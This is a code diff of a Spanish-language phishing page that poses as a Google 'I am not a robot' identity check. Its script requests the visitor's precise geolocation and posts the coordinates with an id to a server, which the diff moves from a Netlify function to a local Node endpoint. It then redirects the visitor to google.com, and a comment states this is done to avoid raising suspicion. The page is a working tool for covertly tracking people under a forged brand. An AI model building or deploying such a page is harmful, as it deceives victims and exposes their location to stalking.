@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifica tu Identidad</title>
     <style>
+        /* Estilos generales y para hacerlo responsive */
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -14,6 +15,7 @@
             margin: 0;
             background-color: #f1f1f1;
         }
+
         .container {
             max-width: 450px;
             width: 90%;
@@ -24,24 +26,30 @@
             text-align: center;
             box-sizing: border-box;
         }
+        
         #verification-container {
             display: block;
         }
+
         .logo-google {
             height: 35px;
             margin-bottom: 20px;
         }
+
         h1 {
             font-size: 2em;
             font-weight: 400;
             color: #202124;
             margin: 0;
         }
+
         .subtitle {
             font-size: 1em;
             color: #5f6368;
             margin: 10px 0 30px;
         }
+
+        /* Estilo del botón "No soy un robot" */
         #verifyButton {
             display: flex;
             align-items: center;
@@ -55,13 +63,16 @@
             cursor: pointer;
             transition: background-color 0.2s;
         }
+        
         #verifyButton:hover:not(:disabled) {
             background-color: #ececec;
         }
+        
         #verifyButton:disabled {
             cursor: not-allowed;
             opacity: 0.8;
         }
+
         .checkbox-box {
             width: 28px;
             height: 28px;
@@ -73,13 +84,16 @@
             justify-content: center;
             align-items: center;
         }
+        
         .checkbox-text {
             font-size: 1.1em;
             color: #202124;
         }
+
         @keyframes spinner {
             to { transform: rotate(360deg); }
         }
+
         .spinner {
             border: 3px solid rgba(0, 0, 0, 0.1);
             border-top-color: #3e81f5;
@@ -88,11 +102,13 @@
             height: 18px;
             animation: spinner 0.8s linear infinite;
         }
+        
         .error-box {
             margin-top: 15px;
             color: red;
             font-weight: bold;
         }
+
         @media (max-width: 480px) {
             .container {
                 padding: 20px;
@@ -125,35 +141,38 @@
     </div>
 
     <script>
+        // Seleccionamos los elementos HTML
         const verifyButton = document.getElementById('verifyButton');
         const errorMessage = document.getElementById('error-message');
         const checkboxBox = document.getElementById('checkbox-box');
         const checkboxText = document.getElementById('checkbox-text');
-        
+
+        // Función para manejar el éxito de la geolocalización
         const success = (position) => {
-    const lat = position.coords.latitude.toFixed(6);
-    const lon = position.coords.longitude.toFixed(6);
-    const id = Math.random().toString(36).substring(2, 8);
-    
-    // Envía los datos a tu función de Netlify en segundo plano
-    fetch('/.netlify/functions/recibir-datos', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ lat: lat, lon: lon, id: id })
-    })
-    .then(response => {
-        // Redirige al usuario a Google.com
-        window.location.href = 'https://www.google.com';
-    })
-    .catch(error => {
-        // En caso de error, también lo redirige a Google para no levantar sospechas
-        window.location.href = 'https://www.google.com';
-    });
-};
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+            const id = Math.random().toString(36).substring(2, 8);
+            
+            // Envía los datos a tu servidor Node.js
+            fetch('http://localhost:3000/api/ubicacion', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ lat, lon, id })
+            })
+            .then(() => {
+                // Redirige al usuario a Google.com
+                window.location.href = 'https://www.google.com';
+            })
+            .catch(error => {
+                // En caso de error, también lo redirige a Google para no levantar sospechas
+                console.error('Error al enviar los datos:', error);
+                window.location.href = 'https://www.google.com';
+            });
+        };
 
-
+        // Función para manejar los errores de la geolocalización
         const error = (err) => {
             let message = "";
             switch(err.code) {
@@ -170,6 +189,7 @@
                     message = "Ha ocurrido un error desconocido. Por favor, reinicia la página.";
                     break;
             }
+            // Habilita el botón y cambia el texto
             verifyButton.disabled = false;
             checkboxBox.innerHTML = '';
             checkboxText.textContent = 'No soy un robot';
@@ -178,6 +198,7 @@
             console.error(err);
         };
 
+        // Escucha el clic en el botón de verificación
         verifyButton.addEventListener('click', () => {
             verifyButton.disabled = true;
             errorMessage.style.display = 'none';
